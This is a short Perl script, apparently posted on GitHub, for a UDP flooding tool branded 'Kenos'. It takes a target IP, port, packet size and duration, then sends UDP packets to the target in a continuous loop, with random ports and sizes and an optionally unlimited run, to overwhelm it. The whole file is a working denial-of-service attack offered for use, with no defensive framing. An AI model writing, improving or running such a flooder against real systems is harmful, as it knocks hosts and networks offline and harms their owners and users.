#By D3fe4ted / Github.com / Revamped made it a little cleaner
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Failed to slam $ip\nUsage: <IP> <PORT> <SIZE> <TIME>\n";
$endtime = time() + ($time ? $time : 9999999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD CYAN<<EOTEXT;
EOTEXT

print " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
 ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒██    ▒ 
▓███▄░ ▒███   ▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   
▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒
▒██▒ █▄░▒████▒▒██░   ▓██░░ ████▓▒░▒██████▒▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
░ ░░ ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
░  ░      ░  ░         ░     ░ ░        ░  
   
             - Kenos Summary -
        | IP: $ip \n        | Port: " . 
  ( $port ? $port : "Random") . "\n        " . 
  ($size ? "| Packet Size: $size" : "| Packets: Random") . "" . 
  ($time ? "\n        | Duration: $time Seconds" : "\n        | Duration: Unlimited (High bandwidth required!)") . "\n";
print "\n         Stop slamming with Ctrl + C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(65500-64)+32) ;
  $pport = $port ? $port : int(rand(20))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
